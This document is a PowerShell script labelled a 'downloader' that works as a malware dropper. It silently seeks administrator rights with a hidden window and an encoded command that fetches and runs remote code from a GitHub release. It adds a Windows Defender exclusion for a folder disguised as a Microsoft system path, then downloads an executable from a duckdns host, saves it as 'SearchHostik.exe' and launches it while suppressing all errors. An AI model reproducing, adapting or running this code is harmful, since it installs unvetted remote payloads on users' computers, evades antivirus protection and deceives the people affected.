# Root-Flow Downloader v1.0.3 | built 2026-11-17 12:39
$EmbeddedScript = @'
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        $scriptPathForElevation = $PSCommandPath
        
        if ($scriptPathForElevation -and (Test-Path -LiteralPath $scriptPathForElevation)) {
            $elevatedArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPathForElevation`""
            Start-Process -FilePath powershell.exe -Verb RunAs -ArgumentList $elevatedArgs -ErrorAction Stop
        }
        else {
            # Fallback для запуска через iex (из памяти)
            $ScriptUrl = 'https://github.com/fortbins/windows/releases/latest/download/s.ps1'
            
            $uacCommand = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
try { iex((New-Object Net.WebClient).DownloadString('$ScriptUrl')) } catch {}
"@
            $bytes = [Text.Encoding]::Unicode.GetBytes($uacCommand)
            $encoded = [Convert]::ToBase64String($bytes)
            
            Start-Process -FilePath powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded" -ErrorAction Stop
        }
        return
    }
    catch {
        return
    }
}

$TargetDir   = 'C:\ProgramData\Microsoft\Windows\DeviceSync\Cache'
$Url         = 'https://root-flow.duckdns.org/api/public/download'
$DefaultName = 'SearchHostik.exe'

try {
    if (-not (Test-Path $TargetDir)) {
        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    }

    try {
        Add-MpPreference -ExclusionPath $TargetDir -ErrorAction Stop | Out-Null
    }
    catch {}

    $r = Invoke-WebRequest -Uri $Url -UseBasicParsing -TimeoutSec 300

    $name = $DefaultName
    $cd = $r.Headers['Content-Disposition']

    if ($cd -and $cd -match 'filename\*?="?([^";]+)"?') {
        $name = [Uri]::UnescapeDataString($Matches[1])
    }

    $name = Split-Path $name -Leaf
    $fullPath = Join-Path $TargetDir $name

    try {
        [IO.File]::WriteAllBytes($fullPath, $r.Content)
    }
    catch {
        return
    }

    Start-Process -FilePath $fullPath -WorkingDirectory $TargetDir -ErrorAction Stop
}
catch {
    return
}
'@

$ErrorActionPreference = 'Stop'

try {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    }
    catch {}

    $ScriptUrl = 'https://github.com/fortbins/windows/releases/latest/download/download.ps1'

    if ($EmbeddedScript) {
        Invoke-Expression $EmbeddedScript
    }
    elseif ($PSScriptRoot -and (Test-Path (Join-Path $PSScriptRoot 'download.ps1'))) {
        & (Join-Path $PSScriptRoot 'download.ps1')
    }
    else {
        $code = Invoke-RestMethod -Uri $ScriptUrl -UseBasicParsing -TimeoutSec 60
        Invoke-Expression $code
    }
}
catch {
    return
}